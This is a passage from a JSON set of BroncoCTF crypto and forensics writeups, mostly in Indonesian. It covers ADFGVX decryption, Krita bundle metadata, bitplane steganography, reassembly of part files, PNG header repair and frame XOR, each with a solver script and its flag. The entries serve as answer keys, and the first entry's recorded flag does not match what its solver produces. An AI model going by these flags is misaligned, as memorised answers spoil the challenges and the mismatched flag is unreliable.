        "code": "#!/usr/bin/env python3\r\n\"\"\"Solver for the Crypto challenge: Grandma's Secret.\"\"\"\r\n\r\nfrom __future__ import annotations\r\n\r\nfrom math import ceil\r\n\r\nLABELS = \"ADFGVX\"\r\nKEY = \"SUGAR\"\r\nCIPHERTEXT = \"GVXXFVXVAFXFXVGADAFF\"\r\n\r\n# Square copied from the image. Rows and columns both use A D F G V X.\r\nSQUARE = (\r\n    \"B3MRLI\",\r\n    \"A6F082\",\r\n    \"C7SEUH\",\r\n    \"Z9DXKV\",\r\n    \"1QYW5P\",\r\n    \"NJT4GO\",\r\n)\r\n\r\n\r\ndef undo_columnar_transposition(ciphertext: str, key: str) -> str:\r\n    \"\"\"Undo a standard columnar transposition read in sorted-key order.\"\"\"\r\n    width = len(key)\r\n    length = len(ciphertext)\r\n    rows = ceil(length / width)\r\n    remainder = length % width\r\n\r\n    # During encryption, columns before `remainder` in original order receive\r\n    # one extra character when the final row is incomplete.\r\n    original_lengths = [rows if remainder == 0 or i < remainder else rows - 1 for i in range(width)]\r\n    sorted_indices = sorted(range(width), key=lambda i: (key[i], i))\r\n\r\n    columns = [\"\"] * width\r\n    offset = 0\r\n    for original_index in sorted_indices:\r\n        column_length = original_lengths[original_index]\r\n        columns[original_index] = ciphertext[offset : offset + column_length]\r\n        offset += column_length\r\n\r\n    stream: list[str] = []\r\n    for row in range(rows):\r\n        for column in range(width):\r\n            if row < len(columns[column]):\r\n                stream.append(columns[column][row])\r\n\r\n    return \"\".join(stream)\r\n\r\n\r\ndef decode_adfgvx(stream: str) -> str:\r\n    \"\"\"Decode coordinate pairs using the supplied 6x6 ADFGVX square.\"\"\"\r\n    if len(stream) % 2:\r\n        raise ValueError(\"ADFGVX coordinate stream must have an even length\")\r\n\r\n    coordinates = {\r\n        LABELS[row] + LABELS[column]: SQUARE[row][column]\r\n        for row in range(6)\r\n        for column in range(6)\r\n    }\r\n\r\n    plaintext: list[str] = []\r\n    for index in range(0, len(stream), 2):\r\n        pair = stream[index : index + 2]\r\n        try:\r\n            plaintext.append(coordinates[pair])\r\n        except KeyError as exc:\r\n            raise ValueError(f\"Invalid ADFGVX pair: {pair}\") from exc\r\n\r\n    return \"\".join(plaintext)\r\n\r\n\r\ndef main() -> None:\r\n    coordinate_stream = undo_columnar_transposition(CIPHERTEXT, KEY)\r\n    plaintext = decode_adfgvx(coordinate_stream)\r\n    flag = f\"grodno{{{plaintext.lower()}}}\"\r\n\r\n    print(f\"key               : {KEY}\")\r\n    print(f\"ciphertext        : {CIPHERTEXT}\")\r\n    print(f\"coordinate stream : {coordinate_stream}\")\r\n    print(f\"plaintext         : {plaintext}\")\r\n    print(f\"flag              : {flag}\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "bronco{Slowly_But_Surely_Shifting_Away_Into_The_PascalSnake_Strings_Of_Characters}",
    "lessonsLearned": ""
  },
  {
    "id": "broncoctf-foren-bundle99",
    "title": "Bundle 992026 (Forensics)",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-14",
    "author": "Nattt",
    "ctfName": "BroncoCTF",
    "tags": [],
    "description": "Writeup for challenge Bundle 992026 (Forensics)",
    "problemDescription": "Diberikan sebuah file bernama `chall` yang diduga merupakan resource bundle dari aplikasi Krita.",
    "tools": [],
    "analysis": "1. Identifikasi tipe file `chall` menggunakan command `file`. Didapatkan informasi bahwa file tersebut merupakan file Zip:\n   ```bash\n   file ./chall\n   # ./chall: Zip data (MIME type \"application/x-krita-resourcebundle\"?)\n   ```\n2. Ekstrak isi file Zip tersebut. Di dalamnya terdapat preset brush Krita dengan ekstensi `.kpp` (`paintoppresets/Brush 99.kpp`).\n3. File `.kpp` merupakan file gambar PNG yang menyimpan metadata konfigurasi brush Krita.\n4. Cek metadata file `Brush 99.kpp` menggunakan `exiftool` atau library Python `Pillow`. Metadata tersebut menyimpan konfigurasi XML brush pada field `Preset`.\n5. Di dalam XML tag `<param name=\"brush_definition\">`, terdapat teks brush berupa flag:\n   ```xml\n   <param name=\"brush_definition\" type=\"string\"><![CDATA[<Brush font=\"Segoe UI,9,-1,5,50,0,0,0,0,0\" spacing=\"0.2\" pipe=\"false\" type=\"kis_text_brush\" BrushVersion=\"2\" text=\"bronco{1m4n4rt15ttru5t}\"/> ]]></param>\n   ```\n\nFlag yang didapat: `bronco{1m4n4rt15ttru5t}`",
    "solution": [
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "import zipfile\r\nimport io\r\nfrom PIL import Image\r\n\r\ndef solve():\r\n    with zipfile.ZipFile(\"chall\", \"r\") as z:\r\n        kpp_data = z.read(\"paintoppresets/Brush 99.kpp\")\r\n    \r\n    im = Image.open(io.BytesIO(kpp_data))\r\n    preset_xml = im.info.get('preset', '')\r\n    \r\n    idx = preset_xml.find(\"bronco{\")\r\n    if idx != -1:\r\n        end = preset_xml.find(\"}\", idx)\r\n        flag = preset_xml[idx:end+1]\r\n        print(f\"FLAG: {flag}\")\r\n    else:\r\n        print(\"Flag not found\")\r\n\r\nif __name__ == \"__main__\":\r\n    solve()"
      }
    ],
    "terminalOutputs": [],
    "flag": "bronco{1m4n4rt15ttru5t}",
    "lessonsLearned": ""
  },
  {
    "id": "broncoctf-foren-ex-boost",
    "title": "EX-BOOST",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-14",
    "author": "Nattt",
    "ctfName": "BroncoCTF",
    "tags": [],
    "description": "Writeup for challenge EX-BOOST",
    "problemDescription": "Tiga gambar style Lost Judgment dipakai sebagai petunjuk channel RGB dan indeks bitplane:\n\n| Urutan | Style | Warna | Heat bar | Bitplane | Teks |\n|---|---|---:|---:|---:|---|\n| 1 | Tiger | Red | 1 | bit 0 | `F33L` |\n| 2 | Snake | Green | 3 | bit 2 | `TH3` |\n| 3 | Crane | Blue | 5 | bit 4 | `H34T` |\n\nUrutan dibaca sebagai **RGB**, bukan urutan file yang diberikan. Karena indeks bit dimulai dari nol, heat level `1`, `3`, dan `5` menunjuk ke bit `0`, `2`, dan `4`.\n\nHasil ketiga bagian digabung tanpa spasi:\n\n```text\nF33L + TH3 + H34T\n```",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Recon",
        "content": "File yang diberikan:\n\n```text\nCrane.png\nSnake.png\nTiger.png\n```\n\nKetiganya PNG RGBA biasa. Tidak ada metadata atau file tambahan yang relevan. Petunjuk utama ada pada kalimat:\n\n```text\nI much prefer the RGB trifecta.\nBut what's with the heat bar amount on each style?\n```\n\nStyle dan channel-nya:\n\n```text\nTiger -> Red\nSnake -> Green\nCrane -> Blue\n```\n\nUrutan RGB berarti:\n\n```text\nTiger, Snake, Crane\n```"
      },
      {
        "title": "Bitplane yang dipakai",
        "content": "Heat bar pada masing-masing style menunjukkan level ganjil:\n\n```text\nTiger = 1\nSnake = 3\nCrane = 5\n```\n\nBitplane Python memakai indeks mulai dari nol:\n\n```text\nheat 1 -> bit 0\nheat 3 -> bit 2\nheat 5 -> bit 4\n```\n\nRumus ekstraksinya:\n\n```python\nbit = (channel_value >> bit_index) & 1\n```\n\nNilai `0` dibuat hitam dan nilai `1` dibuat putih."
      },
      {
        "title": "Ekstraksi manual dengan Python",
        "content": "```python\nfrom PIL import Image\n\ntests = [\n    (\"Tiger.png\", 0, 0, \"Tiger_R_bit0.png\"),\n    (\"Snake.png\", 1, 2, \"Snake_G_bit2.png\"),\n    (\"Crane.png\", 2, 4, \"Crane_B_bit4.png\"),\n]\n\nfor filename, channel, bit_index, output in tests:\n    image = Image.open(filename).convert(\"RGB\")\n    selected = image.getchannel(channel)\n\n    plane = selected.point(\n        lambda value: 255 if ((value >> bit_index) & 1) else 0\n    )\n\n    plane.save(output)\n```\n\nHasilnya terlihat langsung:\n\n```text\nTiger R bit 0 -> F33L\nSnake G bit 2 -> TH3\nCrane B bit 4 -> H34T\n```"
      },
      {
        "title": "Solver",
        "content": "Dependency:\n\n```bash\npython3 -m pip install pillow\n```\n\nTesseract dipakai untuk membaca hasil secara otomatis:\n\n```bash\nsudo apt install tesseract-ocr\n```\n\nLetakkan `solve.py` bersama ketiga gambar, lalu jalankan:\n\n```bash\npython3 solve.py\n```\n\nOutput:\n\n```text\n[+] Tiger: channel=R heat=1 bit=0 -> extracted/Tiger_R_bit0.png\n    OCR: F33L\n[+] Snake: channel=G heat=3 bit=2 -> extracted/Snake_G_bit2.png\n    OCR: TH3\n[+] Crane: channel=B heat=5 bit=4 -> extracted/Crane_B_bit4.png\n    OCR: H34T\n<FLAG>bronco{F33LTH3H34T}</FLAG>\n```"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom __future__ import annotations\r\n\r\nimport argparse\r\nimport re\r\nimport shutil\r\nimport subprocess\r\nfrom pathlib import Path\r\n\r\nfrom PIL import Image\r\n\r\n\r\n# Urutan mengikuti petunjuk \"RGB trifecta\":\r\n# Red   -> Tiger\r\n# Green -> Snake\r\n# Blue  -> Crane\r\n#\r\n# Jumlah heat bar yang menyala adalah 1, 3, dan 5.\r\n# Karena indeks bit dimulai dari 0, bitplane-nya menjadi 0, 2, dan 4.\r\nPARTS = [\r\n    {\r\n        \"name\": \"Tiger\",\r\n        \"filename\": \"Tiger.png\",\r\n        \"channel\": \"R\",\r\n        \"channel_index\": 0,\r\n        \"heat_level\": 1,\r\n        \"bit_index\": 0,\r\n    },\r\n    {\r\n        \"name\": \"Snake\",\r\n        \"filename\": \"Snake.png\",\r\n        \"channel\": \"G\",\r\n        \"channel_index\": 1,\r\n        \"heat_level\": 3,\r\n        \"bit_index\": 2,\r\n    },\r\n    {\r\n        \"name\": \"Crane\",\r\n        \"filename\": \"Crane.png\",\r\n        \"channel\": \"B\",\r\n        \"channel_index\": 2,\r\n        \"heat_level\": 5,\r\n        \"bit_index\": 4,\r\n    },\r\n]\r\n\r\n\r\ndef extract_bitplane(\r\n    image_path: Path,\r\n    channel_index: int,\r\n    bit_index: int,\r\n    output_path: Path,\r\n) -> None:\r\n    \"\"\"Extract one RGB bitplane as a black-and-white PNG.\"\"\"\r\n    image = Image.open(image_path).convert(\"RGB\")\r\n    channel = image.getchannel(channel_index)\r\n\r\n    plane = channel.point(\r\n        lambda value: 255 if ((value >> bit_index) & 1) else 0,\r\n        mode=\"1\",\r\n    ).convert(\"L\")\r\n\r\n    plane.save(output_path)\r\n\r\n\r\ndef ocr_part(image_path: Path) -> str | None:\r\n    \"\"\"Read the visible text with Tesseract when available.\"\"\"\r\n    tesseract = shutil.which(\"tesseract\")\r\n    if tesseract is None:\r\n        return None\r\n\r\n    result = subprocess.run(\r\n        [\r\n            tesseract,\r\n            str(image_path),\r\n            \"stdout\",\r\n            \"--psm\",\r\n            \"7\",\r\n            \"-c\",\r\n            \"tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\",\r\n        ],\r\n        stdout=subprocess.PIPE,\r\n        stderr=subprocess.DEVNULL,\r\n        text=True,\r\n        check=False,\r\n    )\r\n\r\n    cleaned = re.sub(r\"[^A-Z0-9]\", \"\", result.stdout.upper())\r\n    return cleaned or None\r\n\r\n\r\ndef main() -> None:\r\n    parser = argparse.ArgumentParser(\r\n        description=\"Extract the hidden text from Static Image\"\r\n    )\r\n    parser.add_argument(\r\n        \"--input-dir\",\r\n        type=Path,\r\n        default=Path(\".\"),\r\n        help=\"folder containing Tiger.png, Snake.png, and Crane.png\",\r\n    )\r\n    parser.add_argument(\r\n        \"--output-dir\",\r\n        type=Path,\r\n        default=Path(\"extracted\"),\r\n        help=\"folder for extracted bitplanes\",\r\n    )\r\n    args = parser.parse_args()\r\n\r\n    args.output_dir.mkdir(parents=True, exist_ok=True)\r\n\r\n    recovered_parts: list[str] = []\r\n\r\n    for item in PARTS:\r\n        source = args.input_dir / item[\"filename\"]\r\n        if not source.exists():\r\n            raise FileNotFoundError(f\"File tidak ditemukan: {source}\")\r\n\r\n        output = args.output_dir / (\r\n            f\"{item['name']}_{item['channel']}_bit{item['bit_index']}.png\"\r\n        )\r\n\r\n        extract_bitplane(\r\n            image_path=source,\r\n            channel_index=item[\"channel_index\"],\r\n            bit_index=item[\"bit_index\"],\r\n            output_path=output,\r\n        )\r\n\r\n        print(\r\n            f\"[+] {item['name']:5s}: \"\r\n            f\"channel={item['channel']} \"\r\n            f\"heat={item['heat_level']} \"\r\n            f\"bit={item['bit_index']} \"\r\n            f\"-> {output}\"\r\n        )\r\n\r\n        text = ocr_part(output)\r\n        if text is None:\r\n            print(\"[*] Tesseract tidak tersedia; baca teks pada gambar hasil.\")\r\n        else:\r\n            recovered_parts.append(text)\r\n            print(f\"    OCR: {text}\")\r\n\r\n    if len(recovered_parts) == len(PARTS):\r\n        body = \"\".join(recovered_parts)\r\n        print(f\"<FLAG>bronco{{{body}}}</FLAG>\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "bronco{F33LTH3H34T}",
    "lessonsLearned": ""
  },
  {
    "id": "broncoctf-foren-letsago",
    "title": "LEts a GO",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-14",
    "author": "Nattt",
    "ctfName": "BroncoCTF",
    "tags": [],
    "description": "Writeup for challenge LEts a GO",
    "problemDescription": "",
    "tools": [],
    "analysis": "Challenge files distributed across multiple directories as hidden parts named `.part_0` to `.part_249`.\nParts total 250 files. Reassembling parts in numerical order reconstructs original content.\nReassembled content contains flag at the beginning: `bronco{3ve4yth1ng_1s_aw3s0me}`.",
    "solution": [
      {
        "title": "Solution",
        "content": "Run Python script to collect all `.part_*` files, sort them by index, concatenate, and extract flag.\n```python\nimport os\n\nparts = {}\nfor root, dirs, files in os.walk(\".\"):\n    for file in files:\n        if file.startswith(\".part_\"):\n            num = int(file.split(\".part_\")[1])\n            parts[num] = os.path.join(root, file)\n\ncombined = bytearray()\nfor i in range(250):\n    with open(parts[i], \"rb\") as f:\n        combined.extend(f.read())\n\nprint(combined.decode().split(\"}\")[0] + \"}\")\n```"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "import os\r\n\r\ndef solve():\r\n    parts = {}\r\n    for root, dirs, files in os.walk(\".\"):\r\n        for file in files:\r\n            if file.startswith(\".part_\"):\r\n                try:\r\n                    num = int(file.split(\".part_\")[1])\r\n                    parts[num] = os.path.join(root, file)\r\n                except ValueError:\r\n                    pass\r\n    \r\n    combined = bytearray()\r\n    for i in range(250):\r\n        with open(parts[i], \"rb\") as f:\r\n            combined.extend(f.read())\r\n            \r\n    content = combined.decode(\"utf-8\", errors=\"ignore\")\r\n    flag = content.split(\"}\")[0] + \"}\"\r\n    print(flag)\r\n\r\nif __name__ == \"__main__\":\r\n    solve()"
      }
    ],
    "terminalOutputs": [],
    "flag": "bronco{3ve4yth1ng_1s_aw3s0me}",
    "lessonsLearned": ""
  },
  {
    "id": "broncoctf-foren-magicways",
    "title": "Magic Ways",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-14",
    "author": "Nattt",
    "ctfName": "BroncoCTF",
    "tags": [],
    "description": "Writeup for challenge Magic Ways",
    "problemDescription": "`chall.png` tidak bisa dibuka karena bagian penting pada header PNG sengaja dirusak:\n\n- signature PNG diganti dengan `DE AD BE EF 00 00 00 00`\n- nilai tinggi gambar pada `IHDR` dibuat `0`\n- CRC chunk `IHDR` dibuat `00000000`\n\nData gambar di dalam chunk `IDAT` masih utuh. Tinggi asli bisa dihitung dari ukuran scanline setelah payload `IDAT` didekompresi.",
    "tools": [],
    "analysis": "### Menentukan tinggi gambar\n\nPNG memakai RGB 8-bit, jadi satu piksel berukuran 3 byte.\n\n```text\nrow data      = 500 × 3 = 1500 byte\nfilter byte   = 1 byte per scanline\nscanline size = 1501 byte\n```\n\nGabungan chunk `IDAT` didekompresi dengan zlib dan menghasilkan `300200` byte:\n\n```text\nheight = 300200 / 1501\nheight = 200\n```\n\nTinggi yang benar adalah `200`, atau `00 00 00 c8` dalam big-endian.",
    "solution": [
      {
        "title": "Recon",
        "content": "Isi ZIP:\n\n```bash\nunzip -l chall.zip\n```\n\n```text\nArchive:  chall.zip\n  Length      Date    Time    Name\n---------  ---------- -----   ----\n     6518  2026-07-01 02:50   chall.png\n---------                     -------\n     6518                     1 file\n```\n\nIdentifikasi file:\n\n```bash\nfile chall.png\n```\n\n```text\nchall.png: data\n```\n\nHeader awal:\n\n```bash\nod -An -tx1 -N48 chall.png\n```\n\n```text\n de ad be ef 00 00 00 00 00 00 00 0d 49 48 44 52\n 00 00 01 f4 00 00 00 00 08 02 00 00 00 00 00 00\n 00 00 00 19 3d 49 44 41 54 78 9c ed dd 77 7c 14\n```\n\nStruktur chunk masih kelihatan:\n\n```text\n00 00 00 0d 49 48 44 52\n            I  H  D  R\n```\n\nNilai `IHDR` yang masih valid:\n\n```text\nwidth      = 00 00 01 f4 = 500\nheight     = 00 00 00 00 = rusak\nbit depth  = 08\ncolor type = 02           = RGB\n```"
      },
      {
        "title": "Byte yang diperbaiki",
        "content": "Signature PNG standar:\n\n```text\n89 50 4e 47 0d 0a 1a 0a\n```\n\nDimensi:\n\n```text\nwidth  = 00 00 01 f4 = 500\nheight = 00 00 00 c8 = 200\n```\n\nCRC32 baru dihitung dari:\n\n```text\n\"IHDR\" + 13 byte data IHDR\n```\n\nHasil CRC:\n\n```text\n91 7b 84 bf\n```\n\nHeader setelah perbaikan:\n\n```text\n89 50 4e 47 0d 0a 1a 0a 00 00 00 0d 49 48 44 52\n00 00 01 f4 00 00 00 c8 08 02 00 00 00 91 7b 84\nbf 00 00 19 3d 49 44 41 54\n```"
      },
      {
        "title": "Solver",
        "content": "Solver menerima `chall.png` langsung atau ZIP yang berisi PNG:\n\n```bash\npython3 solve.py chall.png\n```\n\natau:\n\n```bash\npython3 solve.py chall.zip\n```\n\nOutput:\n\n```text\n[+] Source           : chall.png\n[+] PNG signature    : 89504e470d0a1a0a\n[+] Stored dimensions: 500x0\n[+] IDAT raw size    : 300200 bytes (1501 bytes/scanline)\n[+] Repaired size    : 500x200\n[+] IHDR CRC         : 917b84bf\n[+] Output           : repaired.png\n<FLAG>bronco{wh4t_ar3_mag1c_byt3s}</FLAG>\n```\n\nOCR memakai `tesseract` jika tersedia. Tanpa OCR, buka `repaired.png`; flag tercetak jelas di tengah gambar."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom __future__ import annotations\r\n\r\nimport argparse\r\nimport re\r\nimport shutil\r\nimport struct\r\nimport subprocess\r\nimport zipfile\r\nimport zlib\r\nfrom pathlib import Path\r\n\r\n\r\nPNG_SIGNATURE = b\"\\x89PNG\\r\\n\\x1a\\n\"\r\nCHANNELS_BY_COLOR_TYPE = {\r\n    0: 1,  # grayscale\r\n    2: 3,  # RGB\r\n    3: 1,  # indexed color\r\n    4: 2,  # grayscale + alpha\r\n    6: 4,  # RGBA\r\n}\r\n\r\n\r\ndef load_artifact(path: Path) -> tuple[bytes, str]:\r\n    \"\"\"Read a PNG directly or pull the first PNG member from a ZIP.\"\"\"\r\n    if path.suffix.lower() == \".zip\":\r\n        with zipfile.ZipFile(path) as archive:\r\n            members = [\r\n                name for name in archive.namelist()\r\n                if name.lower().endswith(\".png\") and not name.endswith(\"/\")\r\n            ]\r\n            if not members:\r\n                raise RuntimeError(\"ZIP tidak berisi file PNG\")\r\n            member = members[0]\r\n            return archive.read(member), member\r\n\r\n    return path.read_bytes(), path.name\r\n\r\n\r\ndef parse_chunks(data: bytes) -> list[tuple[int, int, bytes, bytes]]:\r\n    \"\"\"\r\n    Parse PNG chunks starting at offset 8.\r\n\r\n    The signature may be corrupt, but the chunk layout can still be intact.\r\n    Returns: (chunk_offset, data_length, chunk_type, chunk_data)\r\n    \"\"\"\r\n    chunks: list[tuple[int, int, bytes, bytes]] = []\r\n    offset = 8\r\n\r\n    while offset + 12 <= len(data):\r\n        length = struct.unpack(\">I\", data[offset:offset + 4])[0]\r\n        chunk_type = data[offset + 4:offset + 8]\r\n        data_start = offset + 8\r\n        data_end = data_start + length\r\n        crc_end = data_end + 4\r\n\r\n        if crc_end > len(data):\r\n            raise RuntimeError(\r\n                f\"Chunk {chunk_type!r} melewati akhir file pada offset {offset}\"\r\n            )\r\n\r\n        chunk_data = data[data_start:data_end]\r\n        chunks.append((offset, length, chunk_type, chunk_data))\r\n        offset = crc_end\r\n\r\n        if chunk_type == b\"IEND\":\r\n            break\r\n\r\n    return chunks\r\n\r\n\r\ndef infer_height(\r\n    width: int,\r\n    bit_depth: int,\r\n    color_type: int,\r\n    interlace_method: int,\r\n    compressed_idat: bytes,\r\n) -> tuple[int, int, int]:\r\n    \"\"\"Infer image height from the decompressed non-interlaced scanlines.\"\"\"\r\n    if interlace_method != 0:\r\n        raise RuntimeError(\"Solver ini mengharapkan PNG non-interlaced\")\r\n\r\n    channels = CHANNELS_BY_COLOR_TYPE.get(color_type)\r\n    if channels is None:\r\n        raise RuntimeError(f\"Color type PNG tidak didukung: {color_type}\")\r\n\r\n    raw = zlib.decompress(compressed_idat)\r\n    row_bytes = (width * channels * bit_depth + 7) // 8\r\n    scanline_size = 1 + row_bytes  # one filter byte per row\r\n\r\n    if scanline_size <= 1 or len(raw) % scanline_size != 0:\r\n        raise RuntimeError(\r\n            \"Panjang IDAT hasil dekompresi tidak cocok dengan struktur scanline\"\r\n        )\r\n\r\n    return len(raw) // scanline_size, len(raw), scanline_size\r\n\r\n\r\ndef repair_png(data: bytes) -> tuple[bytes, dict[str, int]]:\r\n    if len(data) < 33:\r\n        raise RuntimeError(\"File terlalu kecil untuk menjadi PNG\")\r\n\r\n    if data[12:16] != b\"IHDR\":\r\n        raise RuntimeError(\"Chunk IHDR tidak ditemukan pada posisi normal\")\r\n\r\n    chunks = parse_chunks(data)\r\n    ihdr = next((chunk for chunk in chunks if chunk[2] == b\"IHDR\"), None)\r\n    if ihdr is None:\r\n        raise RuntimeError(\"IHDR tidak ditemukan\")\r\n\r\n    ihdr_offset, ihdr_length, _, ihdr_data = ihdr\r\n    if ihdr_length != 13:\r\n        raise RuntimeError(f\"Panjang IHDR tidak valid: {ihdr_length}\")\r\n\r\n    width, stored_height, bit_depth, color_type, compression, filter_method, interlace = (\r\n        struct.unpack(\">IIBBBBB\", ihdr_data)\r\n    )\r\n\r\n    if compression != 0 or filter_method != 0:\r\n        raise RuntimeError(\"Metode compression/filter PNG tidak didukung\")\r\n\r\n    idat_data = b\"\".join(\r\n        chunk_data\r\n        for _, _, chunk_type, chunk_data in chunks\r\n        if chunk_type == b\"IDAT\"\r\n    )\r\n    if not idat_data:\r\n        raise RuntimeError(\"Chunk IDAT tidak ditemukan\")\r\n\r\n    inferred_height, raw_size, scanline_size = infer_height(\r\n        width=width,\r\n        bit_depth=bit_depth,\r\n        color_type=color_type,\r\n        interlace_method=interlace,\r\n        compressed_idat=idat_data,\r\n    )\r\n\r\n    repaired = bytearray(data)\r\n    repaired[:8] = PNG_SIGNATURE\r\n\r\n    # IHDR data starts 8 bytes after the chunk offset.\r\n    ihdr_data_start = ihdr_offset + 8\r\n    repaired[ihdr_data_start + 4:ihdr_data_start + 8] = struct.pack(\r\n        \">I\", inferred_height\r\n    )\r\n\r\n    new_ihdr_data = bytes(\r\n        repaired[ihdr_data_start:ihdr_data_start + ihdr_length]\r\n    )\r\n    new_crc = zlib.crc32(b\"IHDR\" + new_ihdr_data) & 0xFFFFFFFF\r\n    crc_offset = ihdr_data_start + ihdr_length\r\n    repaired[crc_offset:crc_offset + 4] = struct.pack(\">I\", new_crc)\r\n\r\n    details = {\r\n        \"width\": width,\r\n        \"stored_height\": stored_height,\r\n        \"height\": inferred_height,\r\n        \"raw_size\": raw_size,\r\n        \"scanline_size\": scanline_size,\r\n        \"ihdr_crc\": new_crc,\r\n    }\r\n    return bytes(repaired), details\r\n\r\n\r\ndef extract_flag_with_tesseract(image_path: Path) -> str | None:\r\n    \"\"\"OCR the repaired image when tesseract is installed.\"\"\"\r\n    executable = shutil.which(\"tesseract\")\r\n    if executable is None:\r\n        return None\r\n\r\n    result = subprocess.run(\r\n        [executable, str(image_path), \"stdout\", \"--psm\", \"7\"],\r\n        text=True,\r\n        stdout=subprocess.PIPE,\r\n        stderr=subprocess.DEVNULL,\r\n        check=False,\r\n    )\r\n    match = re.search(r\"bronco\\{[^}\\r\\n]+\\}\", result.stdout)\r\n    return match.group(0) if match else None\r\n\r\n\r\ndef main() -> None:\r\n    parser = argparse.ArgumentParser(\r\n        description=\"Repair the corrupted PNG from Magic Ways\"\r\n    )\r\n    parser.add_argument(\r\n        \"input\",\r\n        nargs=\"?\",\r\n        default=\"chall.png\",\r\n        type=Path,\r\n        help=\"chall.png atau ZIP yang berisi chall.png\",\r\n    )\r\n    parser.add_argument(\r\n        \"-o\",\r\n        \"--output\",\r\n        default=\"repaired.png\",\r\n        type=Path,\r\n        help=\"nama PNG hasil perbaikan\",\r\n    )\r\n    args = parser.parse_args()\r\n\r\n    artifact, member_name = load_artifact(args.input)\r\n    repaired, details = repair_png(artifact)\r\n    args.output.write_bytes(repaired)\r\n\r\n    print(f\"[+] Source           : {member_name}\")\r\n    print(\"[+] PNG signature    : 89504e470d0a1a0a\")\r\n    print(\r\n        f\"[+] Stored dimensions: \"\r\n        f\"{details['width']}x{details['stored_height']}\"\r\n    )\r\n    print(\r\n        f\"[+] IDAT raw size    : {details['raw_size']} bytes \"\r\n        f\"({details['scanline_size']} bytes/scanline)\"\r\n    )\r\n    print(\r\n        f\"[+] Repaired size    : \"\r\n        f\"{details['width']}x{details['height']}\"\r\n    )\r\n    print(f\"[+] IHDR CRC         : {details['ihdr_crc']:08x}\")\r\n    print(f\"[+] Output           : {args.output}\")\r\n\r\n    flag = extract_flag_with_tesseract(args.output)\r\n    if flag:\r\n        print(f\"<FLAG>{flag}</FLAG>\")\r\n    else:\r\n        print(\"[*] Buka repaired.png untuk membaca flag.\")\r\n        print(\"[*] OCR otomatis membutuhkan tesseract.\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "bronco{wh4t_ar3_mag1c_byt3s}",
    "lessonsLearned": ""
  },
  {
    "id": "broncoctf-foren-staticimage",
    "title": "Static Image",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-14",
    "author": "Nattt",
    "ctfName": "BroncoCTF",
    "tags": [],
    "description": "- **CTF:** BroncoCTF\n- **Category:** Forensics\n- **Difficulty:** Medium\n- **Flag:** `bronco{n0w_th4ts_dyn4m1c}`",
    "problemDescription": "- **CTF:** BroncoCTF\n- **Category:** Forensics\n- **Difficulty:** Medium\n- **Flag:** `bronco{n0w_th4ts_dyn4m1c}`",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Triage",
        "content": "`static.mp4` adalah video MPEG-4 tanpa audio:\n\n```text\nResolution : 300x300\nFrame rate : 60 FPS\nDuration   : 25 seconds\nFrames     : 1500\nPixel fmt  : yuv420p\n```\n\nSatu frame hanya terlihat seperti TV static hitam-putih. Averaging seluruh video juga tidak mengeluarkan pesan karena sinyalnya tidak disimpan sebagai brightness tetap."
      },
      {
        "title": "Relasi Antar-Frame",
        "content": "Jumlah frame habis dibagi tiga:\n\n```text\n1500 / 3 = 500 triplet\n```\n\nSetiap unit diproses sebagai:\n\n```text\nA = frame[3k]\nB = frame[3k + 1]\nC = frame[3k + 2]\n```\n\nFrame diubah menjadi bitmap hitam-putih dengan threshold `128`, lalu frame pertama dan ketiga di-XOR:\n\n```python\nmask = (A >= 128) ^ (C >= 128)\n```\n\nHasilnya punya dua state:\n\n```text\nblank  -> A dan C identik\nactive -> A XOR C membentuk satu glyph putih\n```\n\nFrame tengah `B` hanya menambah noise."
      },
      {
        "title": "Carrier",
        "content": "State berganti secara periodik:\n\n```text\nblank  sekitar 10 triplet\nactive sekitar 10 triplet\nblank  sekitar 10 triplet\nactive sekitar 10 triplet\n```\n\nSatu glyph diulang selama satu run aktif. Karena itu mask hanya disimpan saat terjadi transisi:\n\n```text\nblank -> active\n```\n\nAda 25 run aktif."
      },
      {
        "title": "Contact Sheet",
        "content": "Hasil XOR terbaca:\n\n```text\nb r o n c\no { n 0 w\n_ t h 4 t\ns _ d y n\n4 m 1 c }\n```\n\nGabungannya:\n\n```text\nbronco{n0w_th4ts_dyn4m1c}\n```\n\nTeksnya merupakan leetspeak dari `now thats dynamic`, sesuai permainan kata pada judul."
      },
      {
        "title": "Solver",
        "content": "```bash\npython3 solve.py static.mp4\n```\n\nOutput:\n\n```text\n[+] Active glyph runs: 25\n[+] Flag: bronco{n0w_th4ts_dyn4m1c}\n```\n\nSimpan contact sheet:\n\n```bash\npython3 solve.py static.mp4 --dump glyphs.png\n```"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
